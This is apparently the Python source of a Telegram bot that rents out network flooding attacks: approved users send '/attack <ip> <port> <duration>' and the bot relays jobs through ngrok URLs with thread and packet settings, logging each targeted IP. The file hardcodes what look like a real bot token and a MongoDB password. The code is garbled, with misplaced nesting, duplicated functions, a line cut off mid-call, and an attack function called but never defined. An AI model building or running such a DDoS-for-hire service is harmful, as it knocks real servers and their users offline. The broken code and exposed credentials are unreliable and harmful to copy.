import os
import logging
import asyncio
import requests
from pymongo import MongoClient
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters
from datetime import datetime, timedelta

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7892163056:AAFa1aMf1H7CVLIzJTvJgQTwhgKJZG1GTgA'  # Replace with your actual Telegram bot token
ADMIN_USER_ID = 7533233807  # Replace with the actual admin user ID
LOGGER_GROUP_ID = '-1002347981202'  # Replace with your actual logger group ID

# Cooldown dictionary and URL usage tracking
cooldown_dict = {}
ngrok_urls = [
    "https://5699-2406-da1a-cf7-1e00-b283-2b31-b691-de9c.ngrok-free.app",
    "https://071e-2406-da1a-cf7-1e00-f4dc-4221-47c1-ccc3.ngrok-free.app",
    "https://ffb1-2a05-d016-7a8-9800-9aa5-82a0-7baf-a78.ngrok-free.app",
    "https://66b3-2a05-d016-7a8-9800-90d-9073-d263-6203.ngrok-free.app"
]
url_usage_dict = {url: None for url in ngrok_urls}

# Valid IP prefixes
valid_ip_prefixes = ('52.', '20.', '14.', '4.', '13.', '100.', '235.')

# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Default packet size, thread, and duration
packet_size = 7
thread = 810
default_duration = 240

# MongoDB Configuration
MONGO_URI = "mongodb+srv://VIP:7OMbiO6JV74CFy0I@cluster0.rezah.mongodb.net/VipDatabase?retryWrites=true&w=majority&appName=Cluster0"
client = MongoClient(MONGO_URI)
db = client['Vip']
users_collection = db['users']
attacked_ips_collection = db['attacked_ips']

async def is_user_allowed(user_id):
    if user_id == ADMIN_USER_ID:
        return True
    
    user = users_collection.find_one({
        'user_id': user_id,
        'expiration_date': {'$gt': datetime.now()}
    })
    return user is not None

def approve_user(user_id, days):
    expiration_date = datetime.now() + timedelta(days=days)
    users_collection.update_one(
        {'user_id': user_id},
        {
            '$set': {
                'user_id': user_id,
                'expiration_date': expiration_date,
                'approved_at': datetime.now()
            }
        },
        upsert=True
    )

def remove_user(user_id):
    users_collection.delete_one({'user_id': user_id})
    # Inform admin about the disapproval
    asyncio.create_task(inform_admin_disapproval(user_id))

def write_attacked_ip(ip):
    attacked_ips_collection.insert_one({
        'ip': ip,
        'attacked_at': datetime.now()
    })

def is_ip_attacked(ip):
    return attacked_ips_collection.find_one({'ip': ip}) is not None

# Inform admin about user disapproval
async def inform_admin_disapproval(user_id):
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    context = CallbackContext(application)
    await context.bot.send_message(
        chat_id=ADMIN_USER_ID,
        text=f"*❌ User {user_id} has been disapproved!*",
        parse_mode='Markdown'
    )
    async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Send welcome video and message
    await context.bot.send_video(chat_id=chat_id, video=open('welcome.mp4', 'rb'))
    await context.bot.send_message(chat_id=chat_id, text=(
        "Welcome to the Attack Bot! 🎉\n\n"
        "This bot allows you to launch attacks with customizable settings. 💥\n"
        "Please note that only authorized users can use this bot. 🔒\n\n"
        "You can choose between default time (240 seconds) or customizable time for your attacks. ⏳\n"
        "Use the buttons below to select your preferred option. 👇\n"
        "If you select the wrong option, use /time to change it. 🔄"
    ), parse_mode='Markdown')

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    # Send inline buttons for time selection
    keyboard = [
        [InlineKeyboardButton("Default Time", callback_data='default_time')],
        [InlineKeyboardButton("Customizable Time", callback_data='custom_time')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="Select your time setting:", reply_markup=reply_markup)

async def button(update: Update, context: CallbackContext):
    query = update.callback_query
    chat_id = query.message.chat.id
    user_id = query.from_user.id

    await query.answer()

    if query.data == 'default_time':
        context.user_data['time_mode'] = 'default'
        await context.bot.send_message(chat_id=chat_id, text=(
            "You have selected *Default Time*.\n"
            "Use /attack <ip> <port> to launch an attack with default settings."
        ), parse_mode='Markdown')
    elif query.data == 'custom_time':
        context.user_data['time_mode'] = 'custom'
        await context.bot.send_message(chat_id=chat_id, text=(
            "You have selected *Customizable Time*.\n"
            "Use /attack <ip> <port> <duration> to launch an attack with custom duration."
        ), parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /attack command from user {user_id} in chat {chat_id}')

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    time_mode = context.user_data.get('time_mode', 'default')

    if time_mode == 'default':
        if len(args) != 2:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port>*", parse_mode='Markdown')
            return
        target_ip, target_port = args[0], int(args[1])
        duration = default_duration
    else:
        if len(args) != 3:
            await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), int(args[2])

    # Check if the port is blocked
    if target_port in blocked_ports:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
        return

    # Check if the IP is valid
    if not target_ip.startswith(valid_ip_prefixes):
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid IP address! Please use an IP with a valid prefix.*", parse_mode='Markdown')
        return

    # Check if the IP has already been attacked
    if is_ip_attacked(target_ip):
        await context.bot.send_message(chat_id=chat_id, text="*❌ This IP address has already been attacked!*", parse_mode='Markdown')
        return

    # Restrict maximum attack duration
    if duration > 240:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Maximum attack duration is 240 seconds!*", parse_mode='Markdown')
        duration = 240

    # Cooldown period in seconds
    cooldown_period = 180
    current_time = datetime.now()

    # Check cooldown
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ You need to wait {remaining_time} seconds before launching another attack!*",
                parse_mode='Markdown'
            )
            return

    # Update the last attack time
    cooldown_dict[user_id] = current_time

    # Log the attack initiation
    await context.bot.send_message(
        chat_id=LOGGER_GROUP_ID,
        text=(
            f"⚔️ Attack initiated by UserID: {user_id}\n"
            f"Username: @{update.effective_user.username}\n"
            f"Name: {update.effective_user.full_name}\n"
            f"Chat ID: {chat_id}\n"
            f"Chat Title: {update.effective_chat.title}\n"
            f"Target IP: {target_ip}\n"
            f"Target Port: {target_port}\n"
            f"Attack Duration: {duration} seconds\n"
            f"Packet Size: {packet_size}\n"
            f"Threads: {thread}"
        ),
        parse_mode='Markdown'
    )

    # Send attack initiation message to the user
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {target_ip}:{target_port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🔥 Let the battlefield ignite! 💥*"
        ),
        parse_mode='Markdown'
    )

    # Launch the attack
    asyncio.create_task(run_attack_command_async(target_ip, target_port, duration, user_id, packet_size, thread, context))

    # Save the attacked IP
    write_attacked_ip(target_ip)
    async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /approve command from user {user_id} in chat {chat_id}')

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can approve users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id> <days>*", parse_mode='Markdown')
        return

    approve_user_id = int(args[0])
    days = int(args[1])

    approve_user(approve_user_id, days)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {approve_user_id} approved for {days} days!*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /remove command from user {user_id} in chat {chat_id}')

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can remove users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    remove_user_id = int(args[0])

    remove_user(remove_user_id)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {remove_user_id} has been removed!*", parse_mode='Markdown')

async def show(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*Current Configuration:*\n"
            f"*📦 Packet Size: {packet_size}*\n"
            f"*🧵 Thread: {thread}*\n"
            f"*⏳ Default Duration: {default_duration} seconds*\n"
        ),
        parse_mode='Markdown'
    )

async def set_packet_size(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'packet_size'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new packet size:*", parse_mode='Markdown')

async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'thread'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new thread count:*", parse_mode='Markdown')

async def handle_setting(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if 'setting' not in context.user_data:
        return

    setting = context.user_data['setting']
    value = update.message.text

    global packet_size, thread, default_duration

    if setting == 'packet_size':
        packet_size = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Packet size updated to {packet_size}*", parse_mode='Markdown')
    elif setting == 'thread':
        thread = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Thread count updated to {thread}*", parse_mode='Markdown')
    elif setting == 'config':
        try:
            packet_size, thread, default_duration = map(int, value.split())
            await context.bot.send_message(chat_id=chat_id, text=f"*Configuration updated: Packet Size={packet_size}, Thread={thread}, Default Duration={default_duration}*", parse_mode='Markdown')
        except ValueError:
            await context.bot.send_message(chat_id=chat_id, text="*Invalid format! Please enter the settings in the format: <packet_size> <thread> <default_duration>*", parse_mode='Markdown')

    del context.user_data['setting']

async def add_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /addngrok <url>*", parse_mode='Markdown')
        return

    new_url = args[0]
    ngrok_urls.append(new_url)
    url_usage_dict[new_url] = None
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Ngrok URL added: {new_url}*", parse_mode='Markdown')

async def remove_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /removengrok <url>*", parse_mode='Markdown')
        return

    url_to_remove = args[0]
    if url_to_remove in ngrok_urls:
        ngrok_urls.remove(url_to_remove)
        url_usage_dict.pop(url_to_remove, None)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Ngrok URL removed: {url_to_remove}*", parse_mode
        async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /approve command from user {user_id} in chat {chat_id}')

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can approve users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 2:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id> <days>*", parse_mode='Markdown')
        return

    approve_user_id = int(args[0])
    days = int(args[1])

    approve_user(approve_user_id, days)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {approve_user_id} approved for {days} days!*", parse_mode='Markdown')

async def remove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    logging.info(f'Received /remove command from user {user_id} in chat {chat_id}')

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can remove users!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    remove_user_id = int(args[0])

    remove_user(remove_user_id)
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {remove_user_id} has been removed!*", parse_mode='Markdown')
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"⚠️ User {remove_user_id} has been disapproved.")

async def show(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*Current Configuration:*\n"
            f"*📦 Packet Size: {packet_size}*\n"
            f"*🧵 Thread: {thread}*\n"
            f"*⏳ Default Duration: {default_duration} seconds*\n"
        ),
        parse_mode='Markdown'
    )

async def set_packet_size(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'packet_size'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new packet size:*", parse_mode='Markdown')

async def set_thread(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'thread'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new thread count:*", parse_mode='Markdown')

async def handle_setting(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if 'setting' not in context.user_data:
        return

    setting = context.user_data['setting']
    value = update.message.text

    global packet_size, thread, default_duration

    if setting == 'packet_size':
        packet_size = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Packet size updated to {packet_size}*", parse_mode='Markdown')
    elif setting == 'thread':
        thread = int(value)
        await context.bot.send_message(chat_id=chat_id, text=f"*Thread count updated to {thread}*", parse_mode='Markdown')
    elif setting == 'config':
        try:
            packet_size, thread, default_duration = map(int, value.split())
            await context.bot.send_message(chat_id=chat_id, text=f"*Configuration updated: Packet Size={packet_size}, Thread={thread}, Default Duration={default_duration}*", parse_mode='Markdown')
        except ValueError:
            await context.bot.send_message(chat_id=chat_id, text="*Invalid format! Please enter the settings in the format: <packet_size> <thread> <default_duration>*", parse_mode='Markdown')

    del context.user_data['setting']

async def add_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /addngrok <url>*", parse_mode='Markdown')
        return

    new_url = args[0]
    ngrok_urls.append(new_url)
    url_usage_dict[new_url] = None
    await context.bot.send_message(chat_id=chat_id, text=f"*✅ Ngrok URL added: {new_url}*", parse_mode='Markdown')

async def remove_ngrok(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /removengrok <url>*", parse_mode='Markdown')
        return

    url_to_remove = args[0]
    if url_to_remove in ngrok_urls:
        ngrok_urls.remove(url_to_remove)
        url_usage_dict.pop(url_to_remove, None)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ Ngrok URL removed: {url_to_remove}*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Ngrok URL not found: {url_to_remove}*", parse_mode='Markdown')

async def show_users(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    users = users_collection.find()
    message = "*Approved Users:*\n"
    for user in users:
        remaining_time = user['expiration_date'] - datetime.now()
        if remaining_time.total_seconds() > 0:
            message += f"✅ UserID: {user['user_id']}, Time Remaining: {remaining_time.days} days, {remaining_time.seconds // 3600} hours\n"
        else:
            message += f"❌ UserID: {user['user_id']}, Time Remaining: {remaining_time.days} days, {remaining_time.seconds // 3600} hours\n"

    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def set_config(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is the admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Only the admin can use this command!*", parse_mode='Markdown')
        return

    context.user_data['setting'] = 'config'
    await context.bot.send_message(chat_id=chat_id, text="*Please enter the new settings in the format: <packet_size> <thread> <default_duration>*", parse_mode='Markdown')

async def help_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if user_id == ADMIN_USER_ID:
        help_text = (
            "*Admin Commands:*\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack\n"
            "/approve <user_id> <days> - Approve a user for a specified number of days\n"
            "/remove <user_id> - Remove a user\n"
            "/show - Show the current packet size, thread, and default duration\n"
            "/set - Set the packet size, thread, and default duration\n"
            "/addngrok <url> - Add a new ngrok URL\n"
            "/removengrok <url> - Remove an existing ngrok URL\n"
            "/users - Show all approved users and their remaining time\n"
            "/help - Show this help message\n"
        )
    else:
        help_text = (
            "*User Commands:*\n"
            "/start - Start the bot\n"
            "/attack <ip> <port> <duration> - Launch an attack (if authorized)\n"
            "/help - Show this help message\n"
        )

    await context.bot.send_message(chat_id=chat_id, text=help_text, parse_mode='Markdown')

async def time_command(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Send initial information message
    await context.bot.send_message(chat_id=chat_id, text=(
        "You can choose between default time (240 seconds) or customizable time.\n"
        "Use the buttons below to select your preferred option.\n"
        "If you select the wrong option, use /time to change it."
    ), parse_mode='Markdown')

    # Send inline buttons
    keyboard = [
        [InlineKeyboardButton("Default Time", callback_data='default_time')],
        [InlineKeyboardButton("Customizable Time", callback_data='custom_time')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await context.bot.send_message(chat_id=chat_id, text="Select your time setting:", reply_markup=reply_markup)

def main():
    logging.info('Starting the bot...')
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove))
    application.add_handler(CommandHandler("show", show))
    application.add_handler(CommandHandler("set", set_config))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("time", time_command))
    application.add_handler(CommandHandler("addngrok", add_ngrok))
    application.add_handler(CommandHandler("removengrok", remove_ngrok))
    application.add_handler(CommandHandler("users", show_users))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_setting))
    application.run_polling()

if __name__ == '__main__':
    main()